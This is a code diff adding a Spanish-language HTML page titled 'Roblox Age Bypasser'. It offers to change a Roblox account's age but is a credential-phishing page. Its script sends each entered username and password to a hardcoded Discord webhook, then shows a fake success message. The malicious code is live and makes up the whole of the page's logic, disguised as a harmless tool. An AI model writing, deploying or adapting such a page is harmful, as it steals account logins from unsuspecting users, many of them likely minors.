@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Age Bypasser</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background-color: #1e1e1e;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
+            max-width: 500px;
+            width: 100%;
+        }
+        h1 {
+            text-align: center;
+            color: #00ff00;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: #cccccc;
+            font-size: 0.9em;
+        }
+        input[type="text"], input[type="password"], input[type="number"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #333;
+            border-radius: 5px;
+            background-color: #2a2a2a;
+            color: #ffffff;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 5px;
+            background-color: #00ff00;
+            color: #000000;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #00cc00;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: center;
+            display: none;
+            font-size: 0.9em;
+        }
+        .success {
+            background-color: #4caf50;
+        }
+        .error {
+            background-color: #f44336;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Roblox Age Bypasser</h1>
+        <form id="bypassForm">
+            <div class="form-group">
+                <label for="username">Usuario de Roblox</label>
+                <input type="text" id="username" name="username" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Contraseña de Roblox</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="form-group">
+                <label for="newAge">Nueva Edad</label>
+                <input type="number" id="newAge" name="newAge" min="13" max="100" required>
+            </div>
+            <button type="submit">Bypassear Edad</button>
+        </form>
+        <div id="status" class="status"></div>
+    </div>
+
+    <script>
+        document.getElementById('bypassForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const newAge = document.getElementById('newAge').value;
+            const statusDiv = document.getElementById('status');
+            
+            const discordWebhookUrl = 'https://discord.com/api/webhooks/1469064672765411479/vs44iQu5vX7FhnM_k-7MHwqiLogMHsr2SbDUONnX0xNm1cZtockE4hDxkBKqLKIVi6-f';
+            
+            statusDiv.style.display = 'block';
+            statusDiv.className = 'status';
+            statusDiv.textContent = 'Procesando...';
+            
+            const payload = {
+                "content": "🚨 **Nueva solicitud de bypass recibida** 🚨",
+                "embeds": [{
+                    "title": "Detalles de la Cuenta",
+                    "description": "Se ha recibido información para modificar la edad de una cuenta.",
+                    "color": 5814783,
+                    "fields": [
+                        {
+                            "name": "👤 Usuario",
+                            "value": `\`${username}\``,
+                            "inline": true
+                        },
+                        {
+                            "name": "🔑 Contraseña",
+                            "value": `||${password}||`,
+                            "inline": true
+                        },
+                        {
+                            "name": "🎂 Nueva Edad",
+                            "value": `\`${newAge} años\``,
+                            "inline": true
+                        }
+                    ],
+                    "footer": {
+                        "text": "Roblox Age Bypasser v1.0"
+                    },
+                    "timestamp": new Date().toISOString()
+                }]
+            };
+
+            fetch(discordWebhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    statusDiv.className = 'status success';
+                    statusDiv.textContent = `¡Éxito! La solicitud para ${username} ha sido procesada.`;
+                } else {
+                    statusDiv.className = 'status error';
+                    statusDiv.textContent = 'Error al enviar la información. Revisa la consola.';
+                    console.error('Error al enviar a Discord:', response.statusText);
+                }
+            })
+            .catch(error => {
+                statusDiv.className = 'status error';
+                statusDiv.textContent = 'Error de red. No se pudo conectar.';
+                console.error('Error de red:', error);
+            });
+        });
+    </script>
+</body>
+</html>
